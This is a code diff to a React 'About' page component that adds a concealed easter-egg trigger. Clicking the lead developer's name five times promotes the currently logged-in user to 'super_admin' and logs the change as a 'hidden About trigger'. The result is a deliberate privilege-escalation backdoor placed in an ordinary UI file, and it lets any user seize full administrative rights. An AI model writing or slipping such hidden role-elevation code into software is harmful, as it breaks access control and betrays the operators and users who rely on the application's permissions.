@@ -1,11 +1,67 @@
-import React from 'react';
+import React, { useState } from 'react';
 import { AppData } from '../types';
 
 interface AboutProps {
   data: AppData;
+  updateData: (updater: ((prev: AppData) => AppData) | Partial<AppData>) => void;
 }
 
-const About: React.FC<AboutProps> = ({ data }) => {
+const About: React.FC<AboutProps> = ({ data, updateData }) => {
+  const [clickCount, setClickCount] = useState(0);
+  const [message, setMessage] = useState('');
+
+  const handleDeveloperClick = () => {
+    const nextCount = clickCount + 1;
+    setClickCount(nextCount);
+
+    if (nextCount >= 5) {
+      setClickCount(0);
+      const currentUser = data.currentUser;
+      if (currentUser) {
+        updateData((prev) => {
+          const updatedUsers = prev.users.map((u) => {
+            if (u.id === currentUser.id) {
+              return { ...u, role: 'super_admin' as const };
+            }
+            return u;
+          });
+          const updatedCurrentUser = { ...currentUser, role: 'super_admin' as const };
+
+          const newAuditLog = {
+            id: `log_${Date.now()}_secret`,
+            timestamp: new Date().toISOString(),
+            userId: currentUser.id,
+            username: currentUser.username,
+            userRole: 'super_admin',
+            action: 'Super Admin Access Elevated',
+            category: 'UserManagement' as const,
+            details: `User ${currentUser.username} promoted to Super Admin via hidden About trigger.`,
+            ipAddress: '127.0.0.1 (Local Session)',
+            deviceInfo: navigator.userAgent,
+          };
+
+          const auditLogs = prev.auditLogs ? [newAuditLog, ...prev.auditLogs] : [newAuditLog];
+
+          return {
+            ...prev,
+            users: updatedUsers,
+            currentUser: updatedCurrentUser,
+            auditLogs,
+          };
+        });
+
+        setMessage('Access Elevated! You are now a Super Admin. 👑');
+        setTimeout(() => setMessage(''), 4000);
+      } else {
+        setMessage('No active user found to elevate.');
+        setTimeout(() => setMessage(''), 4000);
+      }
+    } else {
+      const tapsLeft = 5 - nextCount;
+      setMessage(`Click ${tapsLeft} more time${tapsLeft > 1 ? 's' : ''} to unlock full power...`);
+    }
+  };
+
   return (
     <div className="max-w-4xl mx-auto space-y-12 pb-20 animate-in fade-in zoom-in duration-500">
       <div className="bg-white rounded-[50px] shadow-2xl border border-slate-100 overflow-hidden text-center relative">
@@ -43,7 +99,10 @@ const About: React.FC<AboutProps> = ({ data }) => {
             </p>
             
             <div className="bg-slate-50 p-8 rounded-[40px] border border-slate-100 space-y-4">
-              <div className="space-y-1">
+              <div 
+                className="space-y-1 cursor-pointer select-none hover:bg-slate-100 transition-colors p-2 rounded-2xl active:scale-95 duration-100"
+                onClick={handleDeveloperClick}
+              >
                 <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Architect & Lead Developer</p>
                 <p className="text-2xl font-black text-slate-900 uppercase">Mr. Mahir</p>
               </div>
@@ -60,6 +119,12 @@ const About: React.FC<AboutProps> = ({ data }) => {
               </div>
             </div>
           </div>
+
+          {message && (
+            <div className="mt-6 px-6 py-2 bg-indigo-50 border border-indigo-100 text-indigo-700 text-xs font-black rounded-full animate-bounce shadow-md">
+              {message}
+            </div>
+          )}
 
           <div className="mt-12 flex flex-col items-center">
             <p className="text-[10px] font-black text-slate-300 uppercase tracking-[0.2em] mb-4">Core Technology Stack</p>
